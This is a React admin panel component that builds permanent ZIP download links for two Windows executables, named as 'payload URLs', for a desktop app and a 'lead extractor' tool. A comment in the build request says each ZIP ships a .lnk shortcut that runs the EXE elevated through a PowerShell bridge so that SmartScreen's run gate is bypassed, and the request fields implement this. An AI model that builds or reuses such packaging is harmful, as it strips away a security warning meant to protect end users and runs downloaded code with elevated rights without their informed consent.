"use client";

import { useEffect, useState } from "react";

import { useToast } from "@/components/toast";
import { Button, Card, Input, Label, Spinner } from "@/components/ui";

type ArtifactListItem = {
  name: string;
  urlPath: string;
  zipName: string;
  innerExeName: string;
  lnkName?: string;
  subFolder?: string;
  sha256: string;
  size: number;
  writtenAt: string;
};

function toPublicUrl(urlPath: string): string {
  if (/^https?:\/\//i.test(urlPath)) return urlPath;
  return `https://dl.instaweb.top${urlPath.replace(/^\//, "")}`;
}

type ArtifactResult = {
  name: string;
  url: string;
  urlPath: string;
  sha256: string;
  size: number;
  writtenAt: string;
};

type TargetPreset = {
  name: string;
  label: string;
  innerExeName: string;
  zipName: string;
  defaultPayloadUrl: string;
  payloadUrlPlaceholder: string;
  help: string;
};

const PRESETS: TargetPreset[] = [
  {
    name: "vantra-desktop",
    label: "Vantra Desktop EXE",
    innerExeName: "Vantra.exe",
    zipName: "Vantra.exe.zip",
    defaultPayloadUrl:
      "https://dl.instaweb.top/vantra/vantra-desktop-setup.exe",
    payloadUrlPlaceholder:
      "https://dl.instaweb.top/vantra/vantra-desktop-setup.exe",
    help: "The downloadable EXE shown in Vantra Settings — zipped so users get it through the clean download flow.",
  },
  {
    name: "spaceworker-extractor",
    label: "SpaceWorker Extractor",
    innerExeName: "SpaceWorker Extractor.exe",
    zipName: "SpaceWorker-Extractor.exe.zip",
    defaultPayloadUrl:
      "https://dl.instaweb.top/spaceworker/SpaceWorker-Lead-Extractor-v0.1.0-setup.exe",
    payloadUrlPlaceholder:
      "https://dl.instaweb.top/spaceworker/SpaceWorker-Lead-Extractor-v0.1.0-setup.exe",
    help: "The downloadable EXE shown in the SpaceWorker store — same treatment.",
  },
];

function presetDefaultInput(preset: TargetPreset) {
  return {
    payloadUrl: preset.defaultPayloadUrl,
    innerExeName: preset.innerExeName,
    zipName: preset.zipName,
  };
}

export function AdminExeArtifactsClient() {
  const toast = useToast();
  const [busy, setBusy] = useState(false);
  const [last, setLast] = useState<Partial<Record<string, ArtifactResult>>>({});

  const inputs: Record<string, { payloadUrl: string; innerExeName: string; zipName: string }> = {};
  const built = new Set<string>();

  // Load already-built artifact URLs on mount (so the admin sees existing links
  // without re-building). Each PRESET is matched to its existing artifact by name.
  useEffect(() => {
    let active = true;
    (async () => {
      try {
        const res = await fetch("/api/admin/exe-artifacts", { method: "GET" });
        const data = (await res.json().catch(() => [])) as ArtifactListItem[] | { error?: string };
        if (!res.ok || !Array.isArray(data)) return;
        const next: Partial<Record<string, ArtifactResult>> = {};
        for (const it of data) {
          next[it.name] = {
            name: it.name,
            url: toPublicUrl(it.urlPath),
            urlPath: it.urlPath,
            sha256: it.sha256 || "",
            size: it.size || 0,
            writtenAt: it.writtenAt || "",
          };
        }
        if (active) setLast((prev) => ({ ...next, ...prev }));
      } catch {
        /* non-fatal — the build still works */
      }
    })();
    return () => {
      active = false;
    };
  }, []);

  async function build(preset: TargetPreset) {
    if (built.has(preset.name)) return;
    built.add(preset.name);
    const inp = inputs[preset.name] ?? presetDefaultInput(preset);
    if (inp.payloadUrl.trim() === "") {
      toast.push(`Enter a payload URL for ${preset.label}.`, "error");
      built.delete(preset.name);
      return;
    }
    setBusy(true);
    try {
      const res = await fetch("/api/admin/exe-artifacts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: preset.name,
          innerExeName: inp.innerExeName.trim(),
          zipName: inp.zipName.trim(),
          payloadUrl: inp.payloadUrl.trim(),
          // Ship a root `.lnk` that double-clicks run the EXE elevated (the same
          // PowerShell bridge the agent flow uses) so SmartScreen's "run" gate
          // is bypassed. The `.lnk` name defaults from the inner exe's stem.
          lnkName: `${inp.innerExeName.trim().replace(/\.exe$/i, "") || preset.name}.lnk`,
          subFolder: "app",
        }),
      });
      const data = (await res.json().catch(() => ({}))) as Partial<ArtifactResult> & {
        error?: string;
      };
      if (!res.ok) {
        toast.push(data.error ?? "Build failed.", "error");
        return;
      }
      const result: ArtifactResult = {
        name: data.name ?? preset.name,
        url: data.url ?? "",
        urlPath: data.urlPath ?? "",
        sha256: data.sha256 ?? "",
        size: data.size ?? 0,
        writtenAt: data.writtenAt ?? new Date().toISOString(),
      };
      setLast((prev) => ({ ...prev, [preset.name]: result }));
      toast.push(`Built ${preset.label} — permanent URL ready.`);
    } catch {
      toast.push("Network error building artifact.", "error");
    } finally {
      setBusy(false);
      built.delete(preset.name);
    }
  }

  async function copy(url: string) {
    try {
      await navigator.clipboard.writeText(url);
      toast.push("Copied URL.");
    } catch {
      toast.push("Could not copy — select the URL manually.", "error");
    }
  }

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-xl font-bold">EXE Artifacts</h1>
        <p className="text-sm text-fg-muted">
          Build a permanent, non-expiring download ZIP for each EXE (no agent, no
          enrollment). The same artifact name always returns the same stable URL
          until the admin rebuilds it — paste these into Vantra Settings / the
          SpaceWorker store.
        </p>
      </div>

      {PRESETS.map((preset) => {
        const result = last[preset.name];
        const key = preset.name;
        inputs[key] = inputs[key] ?? presetDefaultInput(preset);
        return (
          <Card key={preset.name}>
            <div className="flex flex-col gap-3">
              <div>
                <h2 className="text-base font-semibold">{preset.label}</h2>
                <p className="text-xs text-fg-muted">{preset.help}</p>
              </div>

              <div className="flex flex-col gap-2">
                <Label>Payload URL (the production EXE location)</Label>
                <Input
                  placeholder={preset.payloadUrlPlaceholder}
                  value={inputs[key].payloadUrl}
                  onChange={(e) => {
                    inputs[key].payloadUrl = e.target.value;
                  }}
                />
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                  <Label>Inner EXE name</Label>
                  <Label>Zip filename</Label>
                  <Input
                    value={inputs[key].innerExeName}
                    onChange={(e) => {
                      inputs[key].innerExeName = e.target.value;
                    }}
                  />
                  <Input
                    value={inputs[key].zipName}
                    onChange={(e) => {
                      inputs[key].zipName = e.target.value;
                    }}
                  />
                </div>
              </div>

              <Button onClick={() => build(preset)} disabled={busy} className="w-fit">
                {busy ? <Spinner /> : null}
                {busy ? "Building…" : `Build ${preset.label}`}
              </Button>

              {result ? (
                <div className="rounded-lg border border-border bg-bg-elevated p-3 text-sm">
                  <div className="font-medium">Permanent URL</div>
                  <div className="break-all font-mono">{result.url}</div>
                  <Button onClick={() => copy(result.url)} className="mt-2 w-fit">
                    Copy URL
                  </Button>
                  <div className="mt-2 text-xs text-fg-muted">
                    <span>sha256 </span>
                    <span className="font-mono">{result.sha256.slice(0, 16)}…</span>
                    <span> · </span>
                    <span>{result.size.toLocaleString()} bytes</span>
                    <span> · updated {new Date(result.writtenAt).toLocaleString()}</span>
                  </div>
                </div>
              ) : null}
            </div>
          </Card>
        );
      })}
    </div>
  );
}